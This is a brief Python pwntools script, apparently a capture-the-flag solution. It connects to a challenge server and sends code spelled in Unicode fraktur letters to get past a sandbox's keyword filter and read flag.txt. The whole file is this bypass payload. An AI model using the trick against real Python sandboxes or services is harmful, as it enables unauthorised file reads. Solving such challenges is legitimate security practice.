#!/usr/bin/env python3

from pwn import *

connection = remote('20.80.240.190', 4449)

prompt = connection.recvuntil(b'> ')

connection.sendline('𝔭𝔯𝔦𝔫𝔱(𝔩𝔦𝔰𝔱(𝔬𝔭𝔢𝔫(\'flag.txt\')))')

response = connection.recvall()
print(response.decode())

connection.close()